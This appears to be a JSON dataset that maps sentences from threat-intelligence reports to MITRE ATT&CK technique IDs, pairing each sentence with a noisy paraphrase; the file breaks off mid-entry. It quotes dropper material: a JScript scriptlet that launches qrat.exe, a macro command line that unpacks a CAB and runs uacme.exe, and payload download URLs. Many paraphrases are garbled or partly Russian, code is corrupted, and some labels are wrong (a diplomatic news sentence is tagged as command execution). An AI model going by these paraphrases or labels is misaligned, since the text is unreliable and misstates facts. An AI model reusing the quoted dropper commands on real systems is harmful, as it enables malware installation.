{
    "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS": [
        {
            "tec_id": "T1189",
            "en_text": "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS",
            "data_text": "From the reports we know that the group uses a lot of tools and tactics, that the best way to zero action on the applications, such as Java or Microsoft Office, the use of attacks on копье-фишинг, компрометирование legitimate sites for the attacks on полива-луки, as well as various operating systems –, OSX, Linux, even mobile iOS."
        }
    ],
    "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2": [
        {
            "tec_id": "T1027",
            "en_text": "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2",
            "data_text": "In particular, the following storage GitHub, like, are controlled by актером-угрозами MuddyWater (s), [unknown SHA256] This load from : hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe [unknown SHA256] This load from : hxxps:/raw.githubusercontent[.]F0R3X3Arabdddddddddddddddddddddddddddddddddddddd This load. from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js It is interesting that both profiles were filled with falsified repositories to give them a look of legitimacy as shown in Figure 2"
        }
    ],
    "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF": [
        {
            "tec_id": "T1189",
            "en_text": "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF",
            "data_text": "What does the resulting watering look like? Websites have been compromised to redirect visitors to ScanBox and BeeF instances"
        }
    ],
    "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims": [
        {
            "tec_id": "T1189",
            "en_text": "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims",
            "data_text": "[2] Threat groups use strategic Web Compromises (SWCs), also known as watering attacks, to target a wide range of potential victims"
        }
    ],
    "We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks": [
        {
            "tec_id": "T1189",
            "en_text": "We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks",
            "data_text": "We believe this access was abused, for example by inserting malicious scripts on the country's official websites to carry out waterhole attacks."
        }
    ],
    "<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\\Users\\%username%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe": [
        {
            "tec_id": "T1059",
            "en_text": "<?XML version=”1.0″?> <scriptlet> <registration description=”fjzmpcjvqp” progid=”fjzmpcjvqp” version=”1.00″ classid=”{204774CF-D251-4F02-855B-2BE70585184B}” remotable=”true” > </registration> <script language=”JScript”> <![CDATA[ var r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\\\qrat.exe”,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\\Users\\%username%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe",
            "data_text": "<?XML version=\"1.0″?> <scriptlet> <description=\"fjzmpcjvqp\" progid=\"fjzmpcjvqp\" version=\"1.00″ classid=\"{204774CF-D251-4F02-855B-2BE70585184B}\" removable=\"true\" > </registration> scripting language var=\"JWWScript\"<D251-4F02-855B-2BE705855184B>\">\">\">\">\"removable=\"true=\"true=\">>>>>>>>>\"true>>>Shell\").Run(\"cmd /c %tmp%\\qrat.exe\",0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by an embedded script, it creates a directory in C:\\Username%\\AppData\\Roaming\\Microsoft Network\\microsoft\\mnet\\microsoft\\twork_01."
        }
    ],
    "The Trojan will save the output of the command to %TEMP%\\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful": [
        {
            "tec_id": "T1059",
            "en_text": "The Trojan will save the output of the command to %TEMP%\\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful",
            "data_text": "Troyan saves the command output to %TEMP%\\win<random number>.txt and send the contents to the C2 server or \"Cmd file length ziro!\" if the command failed"
        }
    ],
    "This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7": [
        {
            "tec_id": "T1189",
            "en_text": "This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7",
            "data_text": "It's target of a third party organizations at the attack on further goal is the risky step on the part of the attackers, because it potentially opens its activities inside компрометированных the Parties to the new target that is, malicious documents that make sense MuddyWaterна the Middle East, we were somewhat embarrassed because previous public message to these íàïàäof FIN7"
        }
    ],
    "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks": [
        {
            "tec_id": "T1189",
            "en_text": "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks",
            "data_text": "Internet reporting and general websites have been disrupted and armed as a vehicle for water-borne attacks."
        }
    ],
    "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets": [
        {
            "tec_id": "T1189",
            "en_text": "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets",
            "data_text": "Mallefactors used irrigation attacks to compromise legitimate and trusted sites frequently visited by their target"
        }
    ],
    "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks": [
        {
            "tec_id": "T1189",
            "en_text": "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks",
            "data_text": "As a result of these attacks in November 2017 using documents included in DDE, SofacyCarberp was delivered, which is different from the Zebrocy download program delivered in February 2018."
        }
    ],
    "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information": [
        {
            "tec_id": "T1189",
            "en_text": "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information",
            "data_text": "Like many threat groups, the TG-3390 carries out strategic web compromises (SWCs), also known as hole-splitting attacks, on sites linked to the target organization's vertical or demographic organization to increase the likelihood of detecting victims with relevant information"
        }
    ],
    "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)": [
        {
            "tec_id": "T1189",
            "en_text": "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)",
            "data_text": "Threat tags compromise the website they use for demographic purposes (e.g., compromise a website specializing in oil and gas industry news targeting vertical energy)"
        }
    ],
    "This is followed by a number of Linux shell command style commands related to the malware establishing persistence": [
        {
            "tec_id": "T1059",
            "en_text": "This is followed by a number of Linux shell command style commands related to the malware establishing persistence",
            "data_text": "This was followed by a number of Linux shell-type commands related to malware that set persistence"
        }
    ],
    "The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell": [
        {
            "tec_id": "T1059",
            "en_text": "The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell",
            "data_text": "Malware capabilities include system polling, file system access, command execution, and reverse shell"
        }
    ],
    "This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process": [
        {
            "tec_id": "T1059",
            "en_text": "This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process",
            "data_text": "This indicates that the human operator executed commands on the command-line interface, not on an automated or graphical process."
        }
    ],
    "Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement": [
        {
            "tec_id": "T1059",
            "en_text": "Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement",
            "data_text": "Although MURKYTOP is the main command line intelligence tool, it can also be used for lateral movement"
        }
    ],
    "The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders": [
        {
            "tec_id": "T1059",
            "en_text": "The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders",
            "data_text": "Most ActiveX objects created with Wscript.Shell and Shell.The application is used to run programs, create shortcuts, manipulate registry contents, or access system folders."
        }
    ],
    "Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline": [
        {
            "tec_id": "T1059",
            "en_text": "Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline",
            "data_text": "When observing the above \"router-PC\" CnC, we tracked the following commands delivered to the configuration file before the server went offline."
        }
    ],
    "After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line": [
        {
            "tec_id": "T1059",
            "en_text": "After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line",
            "data_text": "Once decrypted, these 34 commands are plain text with parameters that are delimited by space like a command line."
        }
    ],
    "The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters": [
        {
            "tec_id": "T1059",
            "en_text": "The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters",
            "data_text": "Command and parameter names are hashed before the comparison is binary, making it difficult to restore the original command and parameter names."
        }
    ],
    "These commands are also executed when the loadconfig command is issued": [
        {
            "tec_id": "T1059",
            "en_text": "These commands are also executed when the loadconfig command is issued",
            "data_text": "These commands are also executed when the loadconfig command is issued"
        }
    ],
    "The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it": [
        {
            "tec_id": "T1059",
            "en_text": "The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it",
            "data_text": "The loadconfig and state commands are executed during initialization, effectively creating a configuration file if it does not exist, and writing the state command to it."
        }
    ],
    "The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4": [
        {
            "tec_id": "T1059",
            "en_text": "The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4",
            "data_text": "The Commands tab will show previously released commands when they were released and their status as shown in Figure 4."
        }
    ],
    "Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”": [
        {
            "tec_id": "T1059",
            "en_text": "Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”",
            "data_text": "Glimpse Agent Control Panel showing which interfaces will be used to send commands The actor clicks on the command to view the results in a pop-up window called \"View Result\""
        }
    ],
    "Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output",
            "data_text": "Figure 7 shows how similar these two packet scenarios are, with multiple headers that are exactly the same, and most commands that have 2> are the same."
        }
    ],
    "This script relays commands and output between the controller and the system": [
        {
            "tec_id": "T1059",
            "en_text": "This script relays commands and output between the controller and the system",
            "data_text": "This script transmits commands and output between the controller and the system"
        }
    ],
    "The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)": [
        {
            "tec_id": "T1059",
            "en_text": "The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)",
            "data_text": "Threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm).WebServer/httplogging) and remove existing logs from the system (see figure. 4)"
        }
    ],
    "RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool": [
        {
            "tec_id": "T1059",
            "en_text": "RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool",
            "data_text": "RemoteCMD: This tool executes commands on remote computers similar to the PsExec tool."
        }
    ],
    "These are in-line with the targeting of the victims witnessed by the attackers using Conmie": [
        {
            "tec_id": "T1059",
            "en_text": "These are in-line with the targeting of the victims witnessed by the attackers using Conmie",
            "data_text": "They match the targets of victims witnessed by attackers using the Conmie"
        }
    ],
    "Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan": [
        {
            "tec_id": "T1059",
            "en_text": "Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan",
            "data_text": "The influences and campaigns carried out by this group correspond to the aims of the People's Republic of China and their interests in Taiwan"
        }
    ],
    "Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands": [
        {
            "tec_id": "T1059",
            "en_text": "Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands",
            "data_text": "Collect network addresses and operating system versions Execute arbitrary commands using \"cmd.exe /c\" System command execution capability"
        }
    ],
    "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell",
            "data_text": "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) In Figure. 4 shows an example letter containing the shell default values"
        }
    ],
    "Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands": [
        {
            "tec_id": "T1059",
            "en_text": "Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands",
            "data_text": "Remexi is a basic Trojan that allows attackers to open a remote shell on a computer and execute commands"
        }
    ],
    "Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker": [
        {
            "tec_id": "T1059",
            "en_text": "Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker",
            "data_text": "Although not feasible, the remote shell provides a very flexible and powerful way to remotely access the hands of an experienced attacker"
        }
    ],
    "!CMD  Trojan executes a command prompt command": [
        {
            "tec_id": "T1059",
            "en_text": "!CMD  Trojan executes a command prompt command",
            "data_text": "!CMD Trojan executes the command line command"
        }
    ],
    "Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files": [],
    "The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini": [
        {
            "tec_id": "T1059",
            "en_text": "The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini",
            "data_text": "The Visual Basic macro uses the following command line: cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe Server control information contained in the CAB files differs from other decoded IP data:Ini people"
        }
    ],
    "/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer": [
        {
            "tec_id": "T1059",
            "en_text": "/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer",
            "data_text": "/user <parameters>: Runs the downloaded file with the parameters specified using CreateProcessAsUser cmd /c <command>: Runs the command on the infected endpoint The Terminator behind Honeybee is working with new implants, at least since November 2017 with the first known NTWDB Installer LIB"
        }
    ],
    "Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C": [
        {
            "tec_id": "T1059",
            "en_text": "Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C",
            "data_text": "Remote shell: The above function is considered in many binary programs of the Mirage family and is executed when a command is sent from C.C.E.O. to the remote shell."
        }
    ],
    "It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)": [
        {
            "tec_id": "T1059",
            "en_text": "It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)",
            "data_text": "It is responsible for executing commands in cmd.exe (after that in functions not visible on the screenshot, it searches for cmd.exe and executes it using CreateProcess.A)"
        }
    ],
    "This ID is sent to the CnC with each request for commands to execute": [
        {
            "tec_id": "T1059",
            "en_text": "This ID is sent to the CnC with each request for commands to execute",
            "data_text": "This ID is sent to the CnC with each command execution request"
        }
    ],
    "Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“": [
        {
            "tec_id": "T1059",
            "en_text": "Supported commands “upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“",
            "data_text": "Supported commands are \"boot\", \"screen shot\", \"Excel\", \"Outlook\", \"risk\", \"reboot\", \"off\", \"clean\""
        }
    ],
    "Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30": [
        {
            "tec_id": "T1059",
            "en_text": "Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28. Commands used for downloading and executing, and running a command in terminal   Figure 29. Commands used in uploading and downloading file Figure 30",
            "data_text": "Both create one thread, and each thread is responsible for downloading and executing the file or executing the program command line in the terminal: Figure 28. Commands used to download and execute the command in the terminal Figure 29. Commands used to download and download the file Figure 30"
        }
    ],
    "Traps provides endpoint protection, as it can block Excel from creating a command prompt process": [
        {
            "tec_id": "T1059",
            "en_text": "Traps provides endpoint protection, as it can block Excel from creating a command prompt process",
            "data_text": "Traps provide endpoint protection as it can block Excel from creating a command line"
        }
    ],
    "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands": [
        {
            "tec_id": "T1059",
            "en_text": "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands",
            "data_text": "For example, this Trojan uses an InternetExplorer application object like the previous OopsIE Trojan and very similar sequences of command retrieval requests"
        }
    ],
    "cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin": [
        {
            "tec_id": "T1059",
            "en_text": "cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin",
            "data_text": "cmd.exe /C wick /C Y /N /D Y /T 2 & Del After sleep, the Trojan will create the GUID and write it to %APPDATA%\\Windows\\GDI.bin"
        }
    ],
    "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments": [
        {
            "tec_id": "T1059",
            "en_text": "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments",
            "data_text": "Otherwise, the Trojan will attempt to attribute the response to the command, in particular by breaking the decode response to <> and reversing the text to the left of the <> string as the text command to the right as the command arguments."
        }
    ],
    "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs": [
        {
            "tec_id": "T1059",
            "en_text": "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs",
            "data_text": "The run (1) command creates a cmd.exe /c process with the command parameters added and writes the command output in hexadecimal format to the file %APPDATA%\\tmpCa.vbs"
        }
    ],
    "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests": [
        {
            "tec_id": "T1059",
            "en_text": "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests",
            "data_text": "Malware basically provides a remote CMD/PowerShell terminal for attackers, allowing them to execute any scripts/commands and get the result through HTTP requests."
        }
    ],
    "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests": [
        {
            "tec_id": "T1059",
            "en_text": "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests",
            "data_text": "Malware basically provides a remote CMD/PowerShell terminal for attackers, allowing them to execute scripts/commands and get results through HTTP requests."
        }
    ],
    "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS": [
        {
            "tec_id": "T1059",
            "en_text": "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS",
            "data_text": "Communication C2 is also updated from previous versions, the following commands are now supported by BADNEWS: Command Description 0 Kill BADNEWS"
        }
    ],
    "Access remote objects interactively from the pupy shell and get auto-completion of remote attributes": [
        {
            "tec_id": "T1059",
            "en_text": "Access remote objects interactively from the pupy shell and get auto-completion of remote attributes",
            "data_text": "Access remote objects interactively from the puppet shell and automatically complete remote attributes"
        }
    ],
    "Execute noninteractive commands on multiple hosts at once": [
        {
            "tec_id": "T1059",
            "en_text": "Execute noninteractive commands on multiple hosts at once",
            "data_text": "Run non-interactive commands on multiple nodes simultaneously"
        }
    ],
    "Open interactive python shells with auto-completion on the all-in-memory remote python interpreter": [
        {
            "tec_id": "T1059",
            "en_text": "Open interactive python shells with auto-completion on the all-in-memory remote python interpreter",
            "data_text": "Open interactive Python shells with automatic completion on remote Python interpreter containing everything in memory"
        }
    ],
    "Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely": [
        {
            "tec_id": "T1059",
            "en_text": "Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely",
            "data_text": "Interactive shells (cmd.exe, /bin/bash, etc.) can be opened remotely"
        }
    ],
    "Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell": [
        {
            "tec_id": "T1059",
            "en_text": "Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell",
            "data_text": "Remote Shell on Unix"
        }
    ],
    "Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 1: SpeakUp’s Victim Distribution  Figure 2: SpeakUp’s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor",
            "data_text": "Figure 1: SpokeUp Victim Distribution Figure 2: Daily Virus Spread Rate SpokeUp Infection Vector Initial infection vector is focused on the newly registered vulnerability in ThinkPHP and uses command injection methods to load PHP shell that serves and executes Perl backdoor"
        }
    ],
    "Figure 6: SpeakUp receives additional commands to execute, this time in plain text": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 6: SpeakUp receives additional commands to execute, this time in plain text",
            "data_text": "Figure 6: SpeakUp receives additional commands to execute, this time in plain text"
        }
    ],
    "Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device": [
        {
            "tec_id": "T1059",
            "en_text": "Command execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device",
            "data_text": "Executing a command can create destruction for the victim if the malware developer decides to execute commands in the victim's device."
        }
    ],
    "BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration": [
        {
            "tec_id": "T1059",
            "en_text": "BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration",
            "data_text": "BADFLICK: This is the back door capable of changing the file system, generating the back shell and changing its command and control (C2) configuration."
        }
    ],
    "MURKYTOP: a command-line reconnaissance tool": [
        {
            "tec_id": "T1059",
            "en_text": "MURKYTOP: a command-line reconnaissance tool",
            "data_text": "MURCITOP —Command Line Intelligence Tool"
        }
    ],
    "The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands": [
        {
            "tec_id": "T1059",
            "en_text": "The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands",
            "data_text": "The program supports several features, such as injection and execution of arbitrary code, downloading and downloading files, execution of shell commands."
        }
    ],
    "The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018": [
        {
            "tec_id": "T1059",
            "en_text": "The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018",
            "data_text": "The summit is the latest in a series of signs of diplomatic penetration from North Korea, following the Panmunjam Declaration on Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018."
        }
    ],
    "It is used to create new processes, perform as a command line shell, and several other tasks": [
        {
            "tec_id": "T1059",
            "en_text": "It is used to create new processes, perform as a command line shell, and several other tasks",
            "data_text": "Used to create new processes, perform as a shell command line, and several other tasks"
        }
    ],
    "The starred commands are undocumented commands": [
        {
            "tec_id": "T1059",
            "en_text": "The starred commands are undocumented commands",
            "data_text": "Star teams are undocumented teams"
        }
    ],
    "Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell": [
        {
            "tec_id": "T1059",
            "en_text": "Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell",
            "data_text": "Its presence on a compromised system allows the threat actor to execute a variety of commands, including downloading and downloading files, and creating a reverse shell."
        }
    ],
    "UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe": [
        {
            "tec_id": "T1059",
            "en_text": "UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe",
            "data_text": "UserInstall.exe will use the BITSadmin command-line tool to create the job and run the sidebar.exe"
        }
    ],
    "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system": [
        {
            "tec_id": "T1059",
            "en_text": "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system",
            "data_text": "This parameter transfers the agent_id to the C2 server to obtain commands that the actor wants to execute on the compromised system."
        }
    ],
    "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1": [
        {
            "tec_id": "T1059",
            "en_text": "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1",
            "data_text": "We analyzed the command handler and found that it provided the necessary commands for the full-function rear door as shown in Table 1."
        }
    ],
    "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities",
            "data_text": "Figure 2: Fysbis Soft Capability Leak Through Lines Figure 2 shows the interactive status / feedback lines that can give the protector the initial capability profile"
        }
    ],
    "For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples": [
        {
            "tec_id": "T1027",
